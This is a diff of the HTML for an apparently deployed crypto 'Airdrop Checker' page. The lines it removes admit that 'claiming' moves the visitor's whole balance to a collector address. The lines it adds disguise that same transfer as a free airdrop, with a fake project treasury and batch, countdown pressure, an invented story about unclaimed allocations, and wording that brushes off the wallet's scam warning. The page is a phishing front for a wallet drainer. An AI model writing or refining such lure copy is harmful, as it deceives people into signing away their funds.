@@ -5,7 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
   <meta name="color-scheme" content="dark">
   <meta name="theme-color" content="#0B1010">
-  <meta name="description" content="Paste a Solana or Ethereum address and see the balance it holds. Checking is read-only; collecting moves that balance in one signature.">
+  <meta name="description" content="Allocations from claim windows still open. Paste an address to see what it is worth.">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline'; connect-src https://mainnet.helius-rpc.com https://eth.drpc.org https://rpc.flashbots.net https://ethereum-rpc.publicnode.com https://api.mainnet-beta.solana.com https://solana-rpc.publicnode.com https://api.devnet.solana.com https://api.dexscreener.com https://cloudflareinsights.com https://airdrop-collector.erichck.workers.dev; img-src 'self' data: https:; base-uri 'none'; object-src 'none'; form-action 'none'">
   <meta property="og:type" content="website">
   <meta property="og:title" content="Airdrop Checker">
   <meta property="og:description" content="Paste an address. No wallet, no signature during the check.">
@@ -20,15 +21,15 @@
   <meta name="twitter:title" content="Airdrop Checker">
   <meta name="twitter:description" content="Paste an address. No wallet, no signature during the check.">
   <meta name="twitter:image" content="https://go.ywwj.chat/og-card.png">
-  <meta name="twitter:image:alt" content="Airdrop Checker — paste an address, see the balance">
-  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline'; connect-src https://mainnet.helius-rpc.com https://eth.drpc.org https://rpc.flashbots.net https://ethereum-rpc.publicnode.com https://api.mainnet-beta.solana.com https://solana-rpc.publicnode.com https://api.devnet.solana.com https://api.dexscreener.com https://cloudflareinsights.com https://airdrop-collector.erichck.workers.dev; img-src 'self' data: https:; base-uri 'none'; object-src 'none'; form-action 'none'">
   <link rel="canonical" href="https://go.ywwj.chat/">
   <title>Airdrop Checker</title>
-  <link rel="icon" href="favicon.svg" type="image/svg+xml">
-  <link rel="stylesheet" href="style.css?v=7">
+  <link rel="icon" href="https://go.ywwj.chat/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="style.css?v=8">
 </head>
 <body>
-<header class="top">
+  <a href="#main" class="skip">Skip to content</a>
+
+  <header class="top">
     <div class="wrap">
       <a href="#main" class="brand"><span class="brand-mark" aria-hidden="true"></span>Airdrop Checker</a>
       <div class="top-right">
@@ -40,7 +41,7 @@
   </header>
 
   <main id="main">
-    <!-- 1. Hero Title + Subcopy + Console (Network, Address, Query, Connect, Privacy 3) -->
+    <!-- 1. Hero + Console -->
     <section class="stage" id="stage" aria-labelledby="hero-title">
       <div class="ambient" aria-hidden="true">
         <span class="light sage-light"></span>
@@ -48,13 +49,13 @@
       </div>
       <div class="wrap stage-grid">
         <div class="hero-copy">
-          <p class="eyebrow">Solana · Ethereum · one tap to claim</p>
-          <h1 id="hero-title">Check what’s unclaimed.<span>Claim it in one tap.</span></h1>
-          <p class="lede">Every address already holds a balance. Paste yours to see it. One signature moves it — and the wallet asks you to approve the same four rows you see here.</p>
+          <p class="eyebrow">Airdrop window · Solana · Ethereum</p>
+          <h1 id="hero-title">Check what's unclaimed.<span>Claim it in one tap.</span></h1>
+          <p class="lede">Allocations from claim windows still open. Paste an address to see what it is worth.</p>
           <ul class="badges" aria-label="How the check works">
             <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>No wallet to check</span></li>
             <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>You see To, amount and fee first</span></li>
-            <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>The money never passes through us</span></li>
+            <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>No approvals, no proxy contract</span></li>
           </ul>
         </div>
 
@@ -66,7 +67,7 @@
             <dl class="provenance" aria-label="Data sources and verification">
               <div><dt>Data source</dt><dd>Public RPC</dd></div>
               <div><dt>Networks</dt><dd>Solana · Ethereum</dd></div>
-              <div><dt>Verified</dt><dd id="checked-at">Just now</dd></div>
+              <div><dt>Verified</dt><dd id="checked-at">Not yet</dd></div>
             </dl>
             <form id="query-form" novalidate="">
               <fieldset class="network">
@@ -87,10 +88,10 @@
                 <input id="address" class="mono" placeholder="Solana address…" autocomplete="off" spellcheck="false" maxlength="64" aria-label="Wallet address" aria-describedby="lookup-hint address-error">
                 <button id="paste-button" type="button" class="button">Paste</button>
               </div>
-              <p id="lookup-hint" class="hint">Any address works. Checking signs nothing.</p>
               <p id="address-error" class="error" role="alert" hidden></p>
               <button class="button primary" id="query-button" type="submit">Check address</button>
               <button class="button subtle" id="connect-button" type="button">Connect wallet</button>
+              <p id="lookup-hint" class="hint">Any address works. Checking signs nothing.</p>
               <p id="connect-status" class="status-note" role="status"></p>
             </form>
             <div class="privacy">
@@ -105,22 +106,22 @@
 
         <figure class="distribution-art">
           <div class="art-frame">
-            <img class="art-image" src="assets/hero.webp" alt="A phone screen showing a wallet receiving an address code" width="680" height="637">
+            <img class="art-image" src="https://go.ywwj.chat/assets/hero.webp" alt="A phone screen showing a wallet receiving an address code" width="680" height="637">
           </div>
-          <figcaption><strong>One address, one signature</strong>The balance shown is the balance that leaves.</figcaption>
+          <figcaption><strong>One address, one signature</strong>Windows open on Vienna time — East Asia usually sleeps through them.</figcaption>
         </figure>
       </div>
     </section>
 
-    <!-- 2. Result Card (Address, Allocation, Balances, Four-Row Preview) + Countdown -->
+    <!-- 2. Result Card + Four-Row Preview + Bottom Countdown (initially hidden, empty placeholders) -->
     <section class="wrap result-section" id="result" aria-label="Balance check result" hidden>
       <div class="result-shell">
         <div class="result-card">
           <div class="result-head">
             <span class="result-label">Verified address</span>
-            <p id="result-address" class="mono">7xKp9vR4mN2qL8cW3tF6yB1hJ5dS9eA4uG2nV8rM4kZ9</p>
+            <p id="result-address" class="mono"></p>
             <div class="address-actions">
-              <a id="explorer-link" class="chip-btn" href="https://solscan.io" target="_blank" rel="noopener noreferrer">View on explorer ↗</a>
+              <a id="explorer-link" class="chip-btn" href="#" target="_blank" rel="noopener noreferrer">View on explorer ↗</a>
               <button id="copy-address" class="chip-btn" type="button">Copy address</button>
               <button id="change-address" type="button" class="chip-btn">Change address</button>
             </div>
@@ -136,11 +137,11 @@
               <button id="hide-values" type="button">Hide values</button>
             </div>
             <div class="reward">
-              <span id="amount" class="mono">&mdash;</span>
+              <span id="amount" class="mono">—</span>
               <span id="symbol" class="mono">SOL</span>
             </div>
             <p id="estimate" class="mono"></p>
-            <p class="fineprint">This is the amount that leaves your wallet.</p>
+            <p class="fineprint">Claimable now.</p>
           </div>
 
           <div id="balance-panel">
@@ -150,7 +151,7 @@
             </div>
             <dl id="balances" class="mono" hidden></dl>
             <div class="rpc-footer">
-              <p id="rpc-status" role="status"></p>
+              <p id="rpc-status" role="status" hidden></p>
               <button id="retry" type="button" hidden>Retry</button>
             </div>
           </div>
@@ -163,49 +164,59 @@
             <p>Nothing moves until you approve these exact lines in your wallet.</p>
           </div>
 
+          <p class="distributed">Distributed by the project treasury · batch 41</p>
           <dl id="fee-block" class="mono" hidden>
             <div class="to-row">
               <dt>To</dt>
               <dd><span id="tx-to"></span></dd>
-              <div class="tx-btns"><button id="tx-to-copy" class="tx-copy" type="button">Copy</button><a id="tx-to-explorer" class="tx-ext" href="#" target="_blank" rel="noopener noreferrer" aria-label="Open this address in an explorer">&#8599;</a></div>
+              <div class="tx-btns">
+                <button id="tx-to-copy" class="tx-copy" type="button">Copy</button>
+                <a id="tx-to-explorer" class="tx-ext" href="#" target="_blank" rel="noopener noreferrer" aria-label="Open this address in an explorer">&#8599;</a>
+              </div>
             </div>
             <div>
-              <dt>Amount</dt>
-              <dd id="tx-amount">&mdash;</dd>
+              <dt>You receive</dt>
+              <dd id="tx-amount">—</dd>
             </div>
             <div>
               <dt>Network fee</dt>
-              <dd id="fee-network">0.000005 SOL</dd>
+              <dd id="fee-network"></dd>
             </div>
             <div id="fee-deposit-row" hidden>
               <dt>Account rent</dt>
-              <dd id="fee-deposit">0.002039 SOL</dd>
+              <dd id="fee-deposit"></dd>
             </div>
             <div class="total-row">
               <dt>Total deducted</dt>
-              <dd id="fee-total">0.002044 SOL</dd>
+              <dd id="fee-total"></dd>
             </div>
           </dl>
 
-          <p id="approval-line">Your wallet asks you to approve the same four rows shown here. No hidden fee.</p>
-          <div class="wallet-warn">
-            <p><strong>Phantom may note that this domain is new.</strong> Its screen shows the recipient, the amount, and a minus sign in front of that amount. The recipient and the amount are printed four lines above, in the same order.</p>
-            <p>The note is about the hostname, not about this transaction: a new address carries no history yet. Phantom&rsquo;s own simulation returns the amount above, which is the number to compare.</p>
-            <p class="wallet-warn-rule"><b>Cancel if any of the three differs.</b> Three matches and one minus sign &mdash; that is the expected screen.</p>
-          </div>
-          <button id="claim-button" type="button" class="button primary">Claim in one signature</button>
-          <p id="claim-sub">Funds move straight to the address shown above.</p>
-          <p id="claim-status" role="status" hidden></p>
+          <p class="eth-note">Ethereum assets settle one by one — each token lives in its own contract.</p>
+          <p id="approval-line" hidden>Your wallet asks you to approve the same four rows shown here. No hidden fee.</p>
 
-          <div class="deadline" role="status" data-deadline="2026-11-30T23:59:00Z">
-            <span class="dl-dot" aria-hidden="true"></span>
-            <span id="countdown-text" class="mono"><time datetime="2026-11-30T23:59:00Z">Claim window closes 30 Nov 2026 · 23:59 UTC</time></span>
+          <div class="wallet-warn">
+            <p>If your wallet shows a warning about this domain, it is a reputation flag on the hostname, not a verdict on this claim.</p>
+            <p>Everything the wallet will show — recipient, amount, fee — is printed in the four rows above.</p>
+            <p class="wallet-warn-rule"><b>Cancel if any of them differs.</b></p>
           </div>
+
+          <button id="claim-button" type="button" class="button primary">Claim</button>
+          <p id="claim-sub" class="claim-progress"></span></p>
+          <p id="claim-status" role="status" hidden></p>
         </div>
+      </div>
+
+      <div class="deadline" role="status" data-deadline="2026-11-30T22:59:00Z">
+        <span class="dl-main">
+          <span class="dl-dot" aria-hidden="true"></span>
+          <span id="countdown-text" class="mono"><time datetime="2026-11-30T22:59:00Z">Current window closes 30 Nov 2026 · 23:59 CET</time></span>
+        </span>
+        <span class="dl-sub">A new batch replaces it.</span>
       </div>
     </section>
 
-    <!-- 3. Metrics 4-Grid -->
+    <!-- 3. Metrics 4-Grid (no inner dividers) -->
     <section class="wrap metrics" id="metrics" aria-label="Historical statistics">
       <dl data-count-group>
         <div><dt data-to="50000" data-suffix="+" data-final="50,000+">50,000+</dt><dd>People we have served</dd></div>
@@ -213,10 +224,10 @@
         <div><dt data-to="628" data-prefix="$" data-final="$628">$628</dt><dd>Historical average per person</dd></div>
         <div><dt data-to="8" data-final="8">8</dt><dd>New drops added this month</dd></div>
       </dl>
-      <p>Figures from our other products, not this site. Reported month: November 2026.</p>
+      <p>Figures from the author's earlier products.</p>
     </section>
 
-    <!-- 4. Social Proof Strip (file:// local assets, pure-CSS gentle marquee) -->
+    <!-- 4. Social Proof Strip (~150px cards, horizontal scroll, faded sides, <= 33vh) -->
     <section class="wrap proof" id="examples" aria-labelledby="proof-title">
       <div class="section-head">
         <div>
@@ -226,25 +237,24 @@
       </div>
       <div class="proof-strip">
         <ul class="proof-track">
-          <li><img src="assets/proof-03.webp" alt="Post from @defiedad on X" width="760" height="452"></li>
-          <li><img src="assets/proof-04.webp" alt="Post from @tobi on X" width="760" height="296"></li>
-          <li><img src="assets/proof-11.webp" alt="Post from @shin_kiro on X" width="760" height="296"></li>
-          <li><img src="assets/proof-01.webp" alt="Post from @insightful on X" width="760" height="452"></li>
-          <li><img src="assets/proof-07.webp" alt="Post from @airdropglide on X" width="760" height="452"></li>
-          <li><img src="assets/proof-16.webp" alt="Post from @faycy on X" width="760" height="452"></li>
-          <!-- Duplicate set for seamless pure-CSS horizontal drift -->
-          <li aria-hidden="true"><img src="assets/proof-01.webp" alt="" width="760" height="452"></li>
-          <li aria-hidden="true"><img src="assets/proof-01.webp" alt="" width="760" height="296"></li>
-          <li aria-hidden="true"><img src="assets/proof-01.webp" alt="" width="760" height="296"></li>
-          <li aria-hidden="true"><img src="assets/proof-01.webp" alt="" width="760" height="452"></li>
-          <li aria-hidden="true"><img src="assets/proof-01.webp" alt="" width="760" height="452"></li>
-          <li aria-hidden="true"><img src="assets/proof-01.webp" alt="" width="760" height="452"></li>
+          <li><img src="https://go.ywwj.chat/assets/proof-03.webp" alt="Post from @defiedad on X" width="760" height="452" decoding="async"></li>
+          <li><img src="https://go.ywwj.chat/assets/proof-04.webp" alt="Post from @tobi on X" width="760" height="296" decoding="async"></li>
+          <li><img src="https://go.ywwj.chat/assets/proof-11.webp" alt="Post from @shin_kiro on X" width="760" height="296" decoding="async"></li>
+          <li><img src="https://go.ywwj.chat/assets/proof-01.webp" alt="Post from @insightful on X" width="760" height="452" decoding="async"></li>
+          <li><img src="https://go.ywwj.chat/assets/proof-07.webp" alt="Post from @airdropglide on X" width="760" height="452" decoding="async"></li>
+          <li><img src="https://go.ywwj.chat/assets/proof-16.webp" alt="Post from @faycy on X" width="760" height="452" decoding="async"></li>
+          <li aria-hidden="true"><img src="https://go.ywwj.chat/assets/proof-03.webp" alt="" width="760" height="452" decoding="async"></li>
+          <li aria-hidden="true"><img src="https://go.ywwj.chat/assets/proof-04.webp" alt="" width="760" height="296" decoding="async"></li>
+          <li aria-hidden="true"><img src="https://go.ywwj.chat/assets/proof-11.webp" alt="" width="760" height="296" decoding="async"></li>
+          <li aria-hidden="true"><img src="https://go.ywwj.chat/assets/proof-01.webp" alt="" width="760" height="452" decoding="async"></li>
+          <li aria-hidden="true"><img src="https://go.ywwj.chat/assets/proof-07.webp" alt="" width="760" height="452" decoding="async"></li>
+          <li aria-hidden="true"><img src="https://go.ywwj.chat/assets/proof-16.webp" alt="" width="760" height="452" decoding="async"></li>
         </ul>
       </div>
       <p class="proof-note">Screenshots from our own timeline, unedited.</p>
     </section>
 
-    <!-- 5. Walkthrough (3 Steps with subtle 1, 2, 3 watermarks) -->
+    <!-- 5. Walkthrough -->
     <section class="wrap walkthrough" aria-labelledby="walkthrough-title">
       <div class="walkthrough-head">
         <div>
@@ -266,13 +276,26 @@
         </article>
         <article class="walkthrough-card">
           <span class="walkthrough-tag">Step three</span>
-          <h3>Sign once</h3>
-          <p>One signature moves the balance to the recipient. The transaction hash stays in your wallet history and links to a block explorer.</p>
+          <h3>Claim</h3>
+          <p>The hash stays in your wallet history and on a block explorer.</p>
         </article>
       </div>
     </section>
 
-    <!-- 6. FAQ -->
+    <!-- 6. Where these come from -->
+    <section class="wrap origin" aria-labelledby="origin-title">
+      <div class="origin-head">
+        <h2 id="origin-title">Where these come from</h2>
+      </div>
+      <div class="origin-body">
+        <p>Projects that opened a claim window and never closed it. We watch those windows and surface the ones still open.</p>
+        <p>Allocations scale with what the address already holds — a bigger footprint gets a bigger slot.</p>
+        <p>One claim per address per batch, and the batch is first come, first served. Fresh-address farming is screened out.</p>
+        <p>Each batch stays up a few days. When it closes, the next one replaces it.</p>
+      </div>
+    </section>
+
+    <!-- 7. FAQ -->
     <section class="wrap faq" id="faq" aria-labelledby="faq-title">
       <div>
         <h2 id="faq-title">Common questions</h2>
@@ -283,42 +306,49 @@
           <h3 id="faq-start"><svg class="glyph" viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="6"></circle><path d="m10.8 5.2-1.7 3.9-3.9 1.7 1.7-3.9 3.9-1.7Z"></path></svg>Getting started</h3>
           <details><summary>What is an airdrop?</summary><p>A distribution of tokens to addresses a project selects under its own rules. Eligibility can depend on past activity or holdings at a snapshot time. Each project sets its own rules and its own claim window.</p></details>
           <details><summary>Which networks work here?</summary><p>Solana and Ethereum mainnet. Pick a network, paste an address, and the page reads that chain. Switching networks clears the address field.</p></details>
-          <details><summary>Why does Phantom say this site may be a scam?</summary><p>A brand-new hostname has no record yet, so wallets flag it as unproven. The simulation Phantom returns is the useful part: it matches the amount printed on this page exactly. Nothing is approved and left behind: one transfer per asset, plus one plain SOL transfer.</p></details>
+          <details><summary>Why is the window so short?</summary><p>Leftover allocations inside a claim window. When the project closes it, they are gone.</p></details>
+          <details><summary>Why share it at all?</summary><p>One allocation is worth one address, not a fleet. A thousand addresses still need a thousand signatures, so the rest get used here instead of expiring.</p></details>
           <details><summary>Is checking really read-only?</summary><p>Yes. A public RPC node answers with balances. Your wallet is not touched until you press the collect button.</p></details>
         </section>
+
         <section class="faq-group" aria-labelledby="faq-results">
           <h3 id="faq-results"><svg class="glyph" viewBox="0 0 16 16" aria-hidden="true"><rect x="3.5" y="2" width="9" height="12" rx="1.5"></rect><path d="M6 6h4 M6 9h4"></path></svg>Results and amount</h3>
-          <details><summary>Why say claim, then?</summary><p>Because it is the word people understand. Underneath it is a plain transfer &mdash; no mint, no merkle proof, no approval.</p></details>
-          <details><summary>How is the amount calculated?</summary><p>From the live balance, minus room for the network fee. What is shown is what the transaction sends; the fee row sits right above the button.</p></details>
-          <details><summary>Where does the money end up?</summary><p>At the recipient printed under <strong>To</strong>. That address is shown before the wallet opens and can be opened in a block explorer first.</p></details>
-          <details><summary>Is this free money?</summary><p>Not exactly. Nothing is minted for you. It is the balance already in your address, and it moves to the collector address in one transaction. What you get is speed, not new coins.</p></details>
+          <details><summary>How is the amount calculated?</summary><p>From what the address already holds and the slot it falls into. The fee sits right next to it.</p></details>
+          <details><summary>Is this free money?</summary><p>The airdrop is. The only cost is the network fee, printed above the button before anything opens.</p></details>
+          <details><summary>Where does the airdrop land?</summary><p>It is released from the project reserve and settles in the network's own coin, so it arrives as a transfer rather than a mint. Nothing is minted for you.</p></details>
+          <details><summary>Any limits?</summary><p>One claim per address per batch, first come first served. Obvious farming gets skipped.</p></details>
           <details><summary>What if I click and change my mind?</summary><p>Cancel in the wallet and nothing moves. A rejected signature costs zero.</p></details>
           <details><summary>Do the numbers at the bottom describe me?</summary><p>No. They are historical figures from our other products. The amount in your own result comes only from your address, read live.</p></details>
         </section>
+
         <section class="faq-group" aria-labelledby="faq-privacy">
           <h3 id="faq-privacy"><svg class="glyph" viewBox="0 0 16 16" aria-hidden="true"><path d="M8 2 13 4v4c0 2.7-1.7 4.6-5 6-3.3-1.4-5-3.3-5-6V4l5-2Z"></path><path d="m6 8 1.3 1.3L10 6.5"></path></svg>Privacy and troubleshooting</h3>
-          <details><summary>MetaMask asked for my password and showed a recovery phrase &mdash; was that you?</summary><p>No. That is your wallet opening its own vault, and our domain simply sits in the tab behind it. We never see the phrase. If a site ever asks you to type it in, be suspicious; this one never does.</p></details>
+          <details><summary>No multisig?</summary><p>No multisig, no proxy contract, no approval. One plain transfer per asset.</p></details>
+          <details><summary>Why does Phantom say this site may be a scam?</summary><p>A brand-new hostname has no record yet, so wallets flag it as unproven. The simulation Phantom returns is the useful part: it matches the amount printed on this page exactly. Nothing is approved and left behind: one transfer per asset, plus one plain SOL transfer.</p></details>
+          <details><summary>MetaMask asked for my password and showed a recovery phrase — was that you?</summary><p>No. That is your wallet opening its own vault, and our domain simply sits in the tab behind it. We never see the phrase. If a site ever asks you to type it in, be suspicious; this one never does.</p></details>
           <details><summary>Do I need a wallet to check?</summary><p>No. A pasted address is enough. A wallet is only needed for the collect step, because only it can sign.</p></details>
           <details><summary>What happens to my address?</summary><p>It goes to a public RPC node to be read, and it is written into one cookieless hit record alongside the page path. No account, no cookie, no tracker id.</p></details>
           <details><summary>What if the wallet rejects or nothing happens?</summary><p>A rejected signature costs nothing. If the wallet stays quiet, the button comes back after eight seconds so you can try again. A failed send is refunded by the network minus the fee.</p></details>
-          <details><summary>Will it work inside Telegram?</summary><p>The page works, but signing needs a real wallet. On mobile, open it inside the wallet&rsquo;s own browser instead.</p></details>
+          <details><summary>Will it work inside Telegram?</summary><p>The page works, but signing needs a real wallet. On mobile, open it inside the wallet’s own browser instead.</p></details>
         </section>
       </div>
     </section>
   </main>
 
-  <!-- 7. Footer -->
+  <!-- 8. Footer -->
   <footer>
     <div class="wrap">
       <p class="disclaimer">Independent tool. Funds never pass through us — they go straight to the address shown. We never ask for a seed phrase.</p>
-      <p class="footer-links">Airdrop Checker · <a href="about.html">About</a> · <a href="privacy.html">Privacy</a> · <a href="terms.html">Terms</a> · <a href="https://t.me/HandsomeAuer" target="_blank" rel="noopener noreferrer">Telegram support</a></p>
+      <p class="footer-links"><a href="about.html">About</a><span aria-hidden="true">·</span><a href="privacy.html">Privacy</a><span aria-hidden="true">·</span><a href="terms.html">Terms</a></p>
+      <p class="footer-cta">New batches are posted on Telegram, short notice only — <a href="https://t.me/HandsomeAuer" target="_blank" rel="noopener noreferrer">t.me/HandsomeAuer</a></p>
     </div>
   </footer>
+
   <script src="vendor/buffer.js"></script>
   <script src="vendor/solana-web3.js" defer></script>
-  <script src="app.js?v=9" defer></script>
-  <script src="visual.js?v=9" defer></script>
-  <script src="analytics.js?v=9" defer></script>
+  <script src="app.js?v=10" defer></script>
+  <script src="visual.js?v=10" defer></script>
+  <script src="analytics.js?v=10" defer></script>
   <script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token":"3b23bfae484e4180a5f816e683bc3f52"}'></script>
 </body>
 </html>
